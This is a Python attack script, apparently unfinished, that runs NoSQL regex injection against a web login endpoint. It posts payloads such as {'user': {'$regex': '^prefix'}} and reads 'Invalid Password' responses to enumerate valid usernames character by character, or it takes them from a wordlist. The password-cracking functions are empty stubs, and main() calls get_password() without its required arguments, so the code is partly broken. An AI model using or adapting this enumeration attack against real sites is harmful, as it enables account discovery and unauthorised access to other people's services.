import argparse
import requests
import string
import os
import sys

parser = argparse.ArgumentParser(description='Brute force username and password')
parser.add_argument('-w', '--wordlist', help='Wordlist of users', required=False)
parser.add_argument('-o', '--output', help='Output file', required=False)
parser.add_argument('-u', '--url', help='Url of the request', required=True)

args = parser.parse_args()
args = vars(args)
url = args['url']

user_list = []
user_and_password = {}

chars_to_test = string.digits + string.ascii_letters

def get_password(user, password):
    pass

def get_passwords():
    pass


def get_users(user):
    for c in chars_to_test:
        print(c, end='')
        sys.stdout.flush()
        payload = {"user": {"$regex": f"^{user}{c}"}, "password": "wrongpasss"}
        request = requests.post(url, json=payload)
        if 'Invalid Password' in request.text:
            payload = {"user": f"{user}{c}", "password": "wrongpasss"}
            request = requests.post(url, json=payload)
            if 'Invalid Password' in request.text:
                user_list.append(f"{user}{c}")
            get_users(f"{user}{c}")
        print('\b', end='')


def wordlist_to_users(path_file):
    if not os.path.isfile(path_file):
        raise Exception(f'{path_file} Not Found!')
    global user_list
    f = open(path_file, "r")
    user_list = f.read().split('\n')


def main():
    if args['wordlist'] is not None:
        wordlist_to_users(args['wordlist'])
        get_password()
    else:
        get_users('')
        print(user_list)
        get_password()


main()
